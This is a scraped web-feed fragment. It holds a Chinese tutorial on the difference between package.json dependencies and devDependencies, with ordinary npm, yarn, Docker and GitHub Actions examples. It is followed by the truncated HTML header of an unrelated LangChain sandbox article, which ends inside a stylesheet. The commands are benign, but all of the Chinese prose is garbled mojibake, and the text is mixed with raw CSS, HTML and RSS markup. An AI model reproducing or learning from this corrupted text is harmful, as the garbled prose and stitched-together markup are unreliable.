#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ ¸å¿ƒåŒºåˆ«æ¦‚è¿°</h2>
<p>åœ¨ Node.js å’Œå‰ç«¯é¡¹ç›®ä¸­ï¼Œ<code>package.json</code> æ–‡ä»¶æ˜¯é¡¹ç›®çš„"èº«ä»½è¯"å’Œ"é…ç½®æ¸…å•"ï¼Œå…¶ä¸­çš„ <code>dependencies</code>ï¼ˆç”Ÿäº§ä¾èµ–ï¼‰å’Œ <code>devDependencies</code>ï¼ˆå¼€å‘ä¾èµ–ï¼‰æ˜¯ç®¡ç†é¡¹ç›®ä¾èµ–çš„ä¸¤å¤§æ ¸å¿ƒå­—æ®µã€‚å®ƒä»¬è™½ç„¶éƒ½ç”¨æ¥å£°æ˜é¡¹ç›®æ‰€éœ€çš„è½¯ä»¶åŒ…ï¼Œä½†åœ¨ä½¿ç”¨åœºæ™¯ã€å®‰è£…æ–¹å¼å’Œéƒ¨ç½²ç­–ç•¥ä¸Šæœ‰ç€æœ¬è´¨åŒºåˆ«ã€‚</p>
<h2 data-id="heading-1">ğŸ“¦ dependenciesï¼šç”Ÿäº§ç¯å¢ƒä¾èµ–</h2>
<h3 data-id="heading-2">å®šä¹‰ä¸ä½œç”¨</h3>
<p><code>dependencies</code> åŒ…å«äº†é¡¹ç›®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œæ‰€å¿…éœ€çš„ä¾èµ–åŒ…ã€‚è¿™äº›æ˜¯é¡¹ç›®ä»£ç <strong>è¿è¡Œæ—¶çœŸæ­£éœ€è¦</strong>çš„åº“å’Œæ¡†æ¶ã€‚</p>
<h3 data-id="heading-3">å…¸å‹åŒ…å«å†…å®¹</h3>
<ul>
<li>
<p><strong>è¿è¡Œæ—¶åº“</strong>ï¼šå¦‚ Reactã€Vueã€Angular ç­‰å‰ç«¯æ¡†æ¶</p>
</li>
<li>
<p><strong>å·¥å…·åº“</strong>ï¼šå¦‚ lodashã€axiosã€moment ç­‰é€šç”¨å·¥å…·</p>
</li>
<li>
<p><strong>æœåŠ¡ç«¯æ¡†æ¶</strong>ï¼šå¦‚ Expressã€Koaã€NestJS</p>
</li>
<li>
<p><strong>æ•°æ®åº“é©±åŠ¨</strong>ï¼šå¦‚ mongooseã€sequelizeã€mysql2</p>
</li>
<li>
<p><strong>å…¶ä»–æ ¸å¿ƒä¾èµ–</strong>ï¼šä»»ä½•é¡¹ç›®è¿è¡Œä¸å¯æˆ–ç¼ºçš„ç¬¬ä¸‰æ–¹åŒ…</p>
</li>
</ul>
<h3 data-id="heading-4">å®‰è£…ä¸ä½¿ç”¨</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># å®‰è£…åˆ° dependencies</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; --save
<span class="hljs-comment"># æˆ–ç®€å†™</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt;
<span class="hljs-comment"># yarn ç­‰ä»·å‘½ä»¤</span>
yarn add &lt;<span class="hljs-keyword">package</span>-name&gt;
</code></pre>
<h3 data-id="heading-5">éƒ¨ç½²å½±å“</h3>
<p>è¿™äº›ä¾èµ–<strong>ä¼šè¢«æ‰“åŒ…</strong>å¹¶éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œç”¨æˆ·æœ€ç»ˆä¸‹è½½çš„ä»£ç åŒ…ä¸­åŒ…å«è¿™äº›ä¾èµ–ã€‚</p>
<h2 data-id="heading-6">ğŸ”§ devDependenciesï¼šå¼€å‘ç¯å¢ƒä¾èµ–</h2>
<h3 data-id="heading-7">å®šä¹‰ä¸ä½œç”¨</h3>
<p><code>devDependencies</code> åŒ…å«äº†ä»…åœ¨å¼€å‘ã€æ„å»ºã€æµ‹è¯•ç­‰é˜¶æ®µéœ€è¦çš„å·¥å…·å’Œåº“ã€‚é¡¹ç›®<strong>è¿è¡Œæ—¶å¹¶ä¸éœ€è¦</strong>è¿™äº›ä¾èµ–ã€‚</p>
<h3 data-id="heading-8">å…¸å‹åŒ…å«å†…å®¹</h3>
<ul>
<li>
<p><strong>æ„å»ºå·¥å…·</strong>ï¼šWebpackã€Viteã€Rollup</p>
</li>
<li>
<p><strong>ä»£ç è´¨é‡å·¥å…·</strong>ï¼šESLintã€Prettierã€Stylelint</p>
</li>
<li>
<p><strong>æµ‹è¯•æ¡†æ¶</strong>ï¼šJestã€Mochaã€Cypress</p>
</li>
<li>
<p><strong>ç±»å‹æ£€æŸ¥</strong>ï¼šTypeScriptã€Flow</p>
</li>
<li>
<p><strong>å¼€å‘æœåŠ¡å™¨</strong>ï¼šnodemonã€webpack-dev-server</p>
</li>
<li>
<p><strong>æ–‡æ¡£å·¥å…·</strong>ï¼šJSDocã€VuePress</p>
</li>
<li>
<p><strong>å…¶ä»–å¼€å‘å·¥å…·</strong>ï¼šå¦‚ä»£ç ç”Ÿæˆå™¨ã€æ„å»ºè„šæœ¬ç­‰</p>
</li>
</ul>
<h3 data-id="heading-9">å®‰è£…ä¸ä½¿ç”¨</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># å®‰è£…åˆ° devDependencies</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; --save-dev
<span class="hljs-comment"># ç®€å†™</span>
npm install &lt;<span class="hljs-keyword">package</span>-name&gt; -D
<span class="hljs-comment"># yarn ç­‰ä»·å‘½ä»¤</span>
yarn add &lt;<span class="hljs-keyword">package</span>-name&gt; --dev
</code></pre>
<h3 data-id="heading-10">éƒ¨ç½²å½±å“</h3>
<p>è¿™äº›ä¾èµ–<strong>ä¸ä¼šè¢«æ‰“åŒ…</strong>åˆ°ç”Ÿäº§ç¯å¢ƒï¼Œæœ€ç»ˆç”¨æˆ·ä¸ä¼šä¸‹è½½è¿™äº›ä»£ç ï¼Œå‡å°‘äº†ç”Ÿäº§åŒ…ä½“ç§¯ã€‚</p>
<h2 data-id="heading-11">ğŸ” è¯¦ç»†å¯¹æ¯”è¡¨æ ¼</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a377572ce24ed28a7019b6f3e0a498~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn55-l6Zey6ZeyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470165&amp;x-signature=UQHSX3YNz7ldt61b0AvVWZTTIuc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">ğŸ› ï¸ ä½¿ç”¨åœºæ™¯ç¤ºä¾‹</h2>
<h3 data-id="heading-13">package.json ç¤ºä¾‹</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-project"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.0"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// è¿è¡Œæ—¶å¿…éœ€</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.3.0"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// HTTP è¯·æ±‚åº“</span>
    <span class="hljs-attr">"vue-router"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.1.0"</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// è·¯ç”±ç®¡ç†</span>
    <span class="hljs-attr">"pinia"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.0"</span>         <span class="hljs-comment">// çŠ¶æ€ç®¡ç†</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span><span class="hljs-punctuation">,</span>         <span class="hljs-comment">// æ„å»ºå·¥å…·</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.0.0"</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// ä»£ç æ£€æŸ¥</span>
    <span class="hljs-attr">"jest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^29.0.0"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// æµ‹è¯•æ¡†æ¶</span>
    <span class="hljs-attr">"prettier"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.0"</span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// ä»£ç æ ¼å¼åŒ–</span>
    <span class="hljs-attr">"@types/node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^18.0.0"</span>  <span class="hljs-comment">// TypeScript ç±»å‹å®šä¹‰</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-14">ä¸åŒç¯å¢ƒçš„å®‰è£…ç­–ç•¥</h3>
<p><strong>å¼€å‘ç¯å¢ƒå®‰è£…æ‰€æœ‰ä¾èµ–ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…æ‰€æœ‰ä¾èµ–ï¼ˆåŒ…æ‹¬ devDependenciesï¼‰</span>
npm install
<span class="hljs-comment"># æˆ–</span>
yarn install
</code></pre>
<p><strong>ç”Ÿäº§ç¯å¢ƒä»…å®‰è£… dependenciesï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># è·³è¿‡ devDependencies</span>
npm install --production
<span class="hljs-comment"># æˆ–è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="hljs-attr">NODE_ENV</span>=production npm install
â€‹
<span class="hljs-comment"># Dockerfile ä¸­çš„å…¸å‹ç”¨æ³•</span>
COPY package*.json ./
RUN npm ci <span class="hljs-attr">--only</span>=production
</code></pre>
<p><strong>CI/CD æµæ°´çº¿ä¼˜åŒ–ï¼š</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions ç¤ºä¾‹</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span>              <span class="hljs-comment"># å®‰è£…æ‰€æœ‰ä¾èµ–ç”¨äºæµ‹è¯•</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">test</span>
<span class="hljs-string">â€‹</span>
  <span class="hljs-attr">deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">ci</span> <span class="hljs-string">--production</span> <span class="hljs-comment"># ä»…å®‰è£…ç”Ÿäº§ä¾èµ–</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">run</span> <span class="hljs-string">build</span>
</code></pre>
<h2 data-id="heading-15">âš ï¸ å¸¸è§è¯¯åŒºä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-16">è¯¯åŒº 1ï¼šéšæ„æ”¾ç½®ä¾èµ–</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå°†æ„å»ºå·¥å…·æ”¾åœ¨ dependencies</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"webpack"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span>  <span class="hljs-comment">// é”™è¯¯ï¼è¿™åº”è¯¥æ˜¯ devDependency</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
â€‹
<span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"webpack"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-17">è¯¯åŒº 2ï¼šç±»å‹å®šä¹‰åŒ…æ”¾ç½®é”™è¯¯</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// å¯¹äº TypeScript é¡¹ç›®ï¼š</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.18.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"@types/express"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.17.0"</span>  <span class="hljs-comment">// ç±»å‹å®šä¹‰æ°¸è¿œæ˜¯ devDependency</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-18">æœ€ä½³å®è·µ</h3>
<ol>
<li>
<p><strong>ä¸¥æ ¼åŒºåˆ†</strong>ï¼šè¿è¡Œæ—¶å¿…éœ€çš„æ”¾ <code>dependencies</code>ï¼Œå¼€å‘å·¥å…·æ”¾ <code>devDependencies</code></p>
</li>
<li>
<p><strong>å®šæœŸå®¡è®¡</strong>ï¼šä½¿ç”¨ <code>npm audit</code> æ£€æŸ¥å®‰å…¨æ¼æ´</p>
</li>
<li>
<p><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.2.0"</span><span class="hljs-punctuation">,</span>   <span class="hljs-comment">// å…¼å®¹æ€§æ›´æ–°</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"~1.3.0"</span>  <span class="hljs-comment">// å°ç‰ˆæœ¬æ›´æ–°</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
<li>
<p><strong>ä¾èµ–æ¸…ç†</strong>ï¼šå®šæœŸåˆ é™¤æœªä½¿ç”¨çš„ä¾èµ–</p>
<pre><code class="hljs language-go" lang="go">npm uninstall &lt;unused-<span class="hljs-keyword">package</span>&gt;
</code></pre>
</li>
</ol>
<h2 data-id="heading-19">ğŸ”¬ é«˜çº§æŠ€å·§</h2>
<h3 data-id="heading-20">æŸ¥çœ‹ä¾èµ–æ ‘</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æŸ¥çœ‹ dependencies ä¾èµ–æ ‘</span>
npm list <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span>
â€‹
<span class="hljs-comment"># ä»…æŸ¥çœ‹ devDependencies</span>
npm list --dev <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span>
â€‹
<span class="hljs-comment"># å›¾å½¢åŒ–æ˜¾ç¤º</span>
npm list <span class="hljs-attr">--depth</span>=<span class="hljs-number">0</span> --json | npx dependency-tree
</code></pre>
<h3 data-id="heading-21">ä¾èµ–åˆ†æå·¥å…·</h3>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># åˆ†æåŒ…å¤§å°</span>
npx source-<span class="hljs-keyword">map</span>-explorer dist/*.js
â€‹
<span class="hljs-comment"># æŸ¥çœ‹é‡å¤ä¾èµ–</span>
npx depcheck
â€‹
<span class="hljs-comment"># å¯è§†åŒ–ä¾èµ–</span>
npx npm-gui
</code></pre>
<h3 data-id="heading-22">package-lock.json ä¸ yarn.lock</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¡®ä¿ä¾èµ–ä¸€è‡´æ€§</span>
npm ci  <span class="hljs-comment"># ä½¿ç”¨ package-lock.json ç²¾ç¡®å®‰è£…</span>
yarn install --frozen-lockfile
</code></pre>
<h2 data-id="heading-23">ğŸ“Š å®é™…æ¡ˆä¾‹åˆ†æ</h2>
<h3 data-id="heading-24">æ¡ˆä¾‹ 1ï¼šå‰åç«¯åˆ†ç¦»é¡¹ç›®</h3>
<pre><code class="hljs language-perl" lang="perl">// frontend/package.json
{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"react"</span>: <span class="hljs-string">"^18.2.0"</span>,
    <span class="hljs-string">"react-dom"</span>: <span class="hljs-string">"^18.2.0"</span>,
    <span class="hljs-string">"antd"</span>: <span class="hljs-string">"^5.0.0"</span>,
    <span class="hljs-string">"react-router-dom"</span>: <span class="hljs-string">"^6.8.0"</span>
  },
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"@vitejs/plugin-react"</span>: <span class="hljs-string">"^3.0.0"</span>,
    <span class="hljs-string">"typescript"</span>: <span class="hljs-string">"^5.0.0"</span>,
    <span class="hljs-string">"@types/react"</span>: <span class="hljs-string">"^18.0.0"</span>,
    <span class="hljs-string">"jest"</span>: <span class="hljs-string">"^29.0.0"</span>
  }
}
â€‹
// backend/package.json  
{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"express"</span>: <span class="hljs-string">"^4.18.0"</span>,
    <span class="hljs-string">"mongoose"</span>: <span class="hljs-string">"^7.0.0"</span>,
    <span class="hljs-string">"jsonwebtoken"</span>: <span class="hljs-string">"^9.0.0"</span>
  },
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"nodemon"</span>: <span class="hljs-string">"^2.0.0"</span>,
    <span class="hljs-string">"@types/express"</span>: <span class="hljs-string">"^4.17.0"</span>,
    <span class="hljs-string">"jest"</span>: <span class="hljs-string">"^29.0.0"</span>
  }
}
</code></pre>
<h3 data-id="heading-25">æ¡ˆä¾‹ 2ï¼šMonorepo é¡¹ç›®</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json (æ ¹ç›®å½•)</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"packages/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lerna"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^6.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.0.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"jest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^29.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
â€‹
<span class="hljs-comment">// packages/web-app/package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"shared-utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"*"</span>  <span class="hljs-comment">// å·¥ä½œåŒºå†…å¼•ç”¨</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^4.0.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-26">Â æ€»ç»“è¦ç‚¹</h2>
<ol>
<li>
<p><strong>æ ¸å¿ƒåŒºåˆ«</strong>ï¼š<code>dependencies</code> ç”¨äºç”Ÿäº§è¿è¡Œï¼Œ<code>devDependencies</code> ç”¨äºå¼€å‘æ„å»º</p>
</li>
<li>
<p><strong>éƒ¨ç½²ç­–ç•¥</strong>ï¼šç”Ÿäº§ç¯å¢ƒè·³è¿‡ <code>devDependencies</code> å®‰è£…ä»¥ä¼˜åŒ–éƒ¨ç½²</p>
</li>
<li>
<p><strong>æ€§èƒ½å½±å“</strong>ï¼šæ­£ç¡®åˆ†ç±»å¯ä»¥å‡å°‘ç”Ÿäº§åŒ…ä½“ç§¯ï¼ŒåŠ å¿«å®‰è£…é€Ÿåº¦</p>
</li>
<li>
<p><strong>å›¢é˜Ÿåä½œ</strong>ï¼šæ˜ç¡®çš„ä¾èµ–åˆ†ç±»æœ‰åŠ©äºå›¢é˜Ÿç†è§£å’Œç»´æŠ¤é¡¹ç›®</p>
</li>
<li>
<p><strong>å®‰å…¨æ€§</strong>ï¼šå®šæœŸå®¡è®¡å’Œæ›´æ–°ä¾èµ–ï¼Œç‰¹åˆ«æ˜¯ç”Ÿäº§ä¾èµ–</p>
</li>
</ol>
<p>è®°ä½ä¸€ä¸ªç®€å•çš„åŸåˆ™ï¼š<strong>å¦‚æœç”¨æˆ·è¿è¡Œä½ çš„åº”ç”¨æ—¶éœ€è¦è¿™ä¸ªåŒ…ï¼Œå®ƒå°±æ˜¯ dependencyï¼›å¦‚æœåªæœ‰å¼€å‘è€…åœ¨ç¼–å†™ã€æµ‹è¯•ã€æ„å»ºæ—¶éœ€è¦ï¼Œå®ƒå°±æ˜¯ devDependencyã€‚</strong> æ­£ç¡®ä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µï¼Œèƒ½è®©ä½ çš„é¡¹ç›®æ›´åŠ ä¸“ä¸šã€é«˜æ•ˆå’Œå¯ç»´æŠ¤ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—]]></title>    <link>https://juejin.cn/post/7592710766010597386</link>    <guid>https://juejin.cn/post/7592710766010597386</guid>    <pubDate>2026-01-08T09:40:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592710766010597386" data-draft-id="7592765004807929907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—"/> <meta itemprop="keywords" content="Serverless"/> <meta itemprop="datePublished" content="2026-01-08T09:40:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Serverlessç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/1794004139382301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¿«é€Ÿä¸Šæ‰‹ï¼šLangChain + AgentRun æµè§ˆå™¨æ²™ç®±æç®€é›†æˆæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1794004139382301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Serverlessç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:40:18.000Z" title="Thu Jan 08 2026 09:40:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»28åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 